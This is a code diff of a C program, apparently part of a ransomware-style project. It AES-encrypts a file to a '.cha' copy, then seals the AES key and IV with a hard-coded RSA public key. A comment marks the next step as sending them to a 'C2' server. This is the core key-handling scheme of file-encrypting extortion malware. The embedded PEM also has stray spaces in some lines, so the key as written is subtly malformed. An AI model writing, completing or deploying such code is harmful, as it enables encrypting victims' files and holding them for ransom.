@@ -11,8 +11,7 @@
 #include <openssl/evp.h>
 #include <openssl/aes.h>
 
-#include <openssl/rsa.h>
-#include <openssl/pem.h>
+
 #include <openssl/rand.h>
 
 #include <openssl/err.h>
@@ -38,25 +37,34 @@ int main(){
     unsigned char iv[16];
     RAND_bytes(iv, sizeof(iv));
 
-    // Authentication string
+    //Authentication string
     static const unsigned char aad[] = "Cyan";
 
+    //Encrypt the specified file
     encrypt_file(key, iv, aad, "atom.png");
 
+    //Decrypt the specified file
     decryptFile(key, iv, aad, "atom.png.cha");
-
-    const char *rsaPublicKeyPEM =
-            "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAl+Ddet9QlwRgiq0m5bks\nK1pECg8k/lPvHjFbdsz2IPWA2annk/aYmN8DZR4+fz1NSy6mcxHoCJPh9mK4ngJ8\nezml7P5008MsDSohPQdaCDlZu3YV7mQGrtx1cZgxN8FjGszAAhU0BovdKM6OHmKb\nvPH08tV/SZuu0skcDDVTHZwrm4GYuFIi6dBLyIKuzYytXNt2Y7YT9r9NINVdpIf5\nnzY+6KobIjX/B3z4IvF8DHyESf8/u+SNAfe+kTK/INO8/TqUY1Y568QH6dbPro7z\nAABa6tj62d7mVD68vaQI6nh5Vh7TN0Ps6SnjBDV+NbTKq1jA5dEH+I9EMJx69n0m\nxyYpt5q5mRdn0ya7VqNkUT7jTZQ2gyPy0Yf8u8jBZ6lpaEvnqltlmsGpx3SAjKkl\nrrnDXqq+VopCIEFBVps1opjZtk5jafp5TP/JCzNFzW3ajaAZdWFbppHCWeegE4d7\nVOJqh+w3jpxAzbAUYu5Sykc2sWZZep82FhBSlqeDBJ1PmOsi5oiMSgAnUNGzaBOn\n1ZWjvXRTAC9zd/EyOzKoQ4eQh7UJYsIdzbDMdgq15Cesgp18+ohvcdtnmAHQ//mH\nKU1TOQ8qlPjvIeYAdXQT+qwXNPTadxszucJs3c+7BLxJMXD/bMh4Sq6PYza3Rg27\n-----END PUBLIC KEY-----";
-
-    // Chiffrer la clé AES
-    RSAEncrypt(key, sizeof(key), "cha.key", rsaPublicKeyPEM);
-
-    // Chiffrer le vecteur d'initialisation (IV)
-    RSAEncrypt(iv, sizeof(iv), "cha.iv", rsaPublicKeyPEM);
-
 
 
     //Encrypt the AES key with the RSA public key
+    const char* public_key_pem = "-----BEGIN PUBLIC KEY-----\n"
+                                 "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAl+Ddet9QlwRgiq0m5bks\n"
+                                 "K1pECg8k/lPvHjFbdsz2IPWA2annk/aYmN8DZR4+fz1NSy6mcxHoCJPh9mK4ngJ8\n"
+                                 "ezml7P5008MsDSohPQdaCDlZu3YV7mQGrtx1cZgxN8FjGszAAhU0BovdKM6OHmKb\n"
+                                 "vPH08tV/SZuu0skcDDVTHZwrm4GYuFIi6dBLyIKuzYytXNt2Y7YT9r9NINVdpIf5\n"
+                                 "nzY+6KobIjX/B3z4IvF8DHyESf8/u+SNAfe+kTK/INO8/TqUY1Y568QH6dbPro7z\n"
+                                 "AABa6tj62d7mVD68vaQI6nh5Vh7TN0Ps6SnjBDV+NbTKq1jA5dEH+I9EMJx69n0m\n"
+                                 "xyYpt5q5mRdn0ya7VqNkUT7jTZQ2gyPy0Yf8u8jBZ6lpaEvnqltlmsGpx3SAjKkl\n"
+                                 "rrnDXqq+VopCIEFBVps1opjZtk5jafp5TP/JCzNFzW3ajaAZdWFbppHCWeegE4d7\n"
+                                 "VOJqh+w3jpxAzbAUYu5Sykc2sWZZep82FhBSlqeDBJ1PmOsi5oiMSgAnUNGzaBOn\n"
+                                 "1ZWjvXRTAC9zd/EyOzKoQ4eQh7UJYsIdzbDMdgq15Cesgp18+ohvcdtnmAHQ//mH\n"
+                                 " KU1TOQ8qlPjvIeYAdXQT+qwXNPTadxszucJs3c+7BLxJMXD/bMh4Sq6PYza3Rg27\n"
+                                 " F07u/gwEJGvCzV87VvqAj90CAwEAAQ==\n"
+                                 "-----END PUBLIC KEY-----";
+    const unsigned char* encrypted_aes_key = encrypt_RSA(public_key_pem, key);
+    const unsigned char* encrypted_iv = encrypt_RSA(public_key_pem, iv);
+
 
     //Send the encrypted AES key and iv to C2
 
